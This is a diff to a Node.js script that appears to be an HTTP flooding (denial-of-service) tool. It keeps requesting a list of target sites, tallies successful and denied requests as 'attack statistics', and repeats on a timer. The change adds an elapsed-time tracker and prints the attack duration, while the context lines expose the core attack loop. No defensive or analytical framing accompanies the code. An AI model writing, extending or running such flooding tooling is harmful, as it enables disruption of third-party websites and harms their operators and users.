@@ -7,6 +7,7 @@ const request = require('request');
 const fs = require('fs');
 const readline = require('readline');
 
+const TIME_START_ATTACK = new Date();
 const urls = [];
 const statistics = {
   success: 0,
@@ -34,6 +35,16 @@ async function updateUrls() {
 
 function attackSite(url, testAttack = false) {
   request(url, bodyRequest.bind({ url, testAttack }));
+}
+
+function timeAfterStart() {
+  const currentTime = new Date() - TIME_START_ATTACK;
+  const s = Math.floor((currentTime / 1000) % 60);
+  const m = Math.floor((currentTime / (1000 * 60)) % 60);
+  const h = Math.floor((currentTime / (1000 * 60 * 60)) % 24);
+  return `${h < 10 ? '0' + h : h}:${m < 10 ? '0' + m : m}:${
+    s < 10 ? '0' + s : s
+  }`;
 }
 
 function bodyRequest(err, res, body) {
@@ -66,7 +77,9 @@ async function startAttack() {
     `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
   );
   await updateUrls();
-  console.log(`Sites count: ${urls.length}`);
+  console.log(
+    `Sites count: ${urls.length}, attack duration: ${timeAfterStart()}`
+  );
   if (urls.length) for await (const url of urls) attackSite(url, true);
   setTimeout(startAttack, DELAY_BETWEEN_ATTACK);
 }
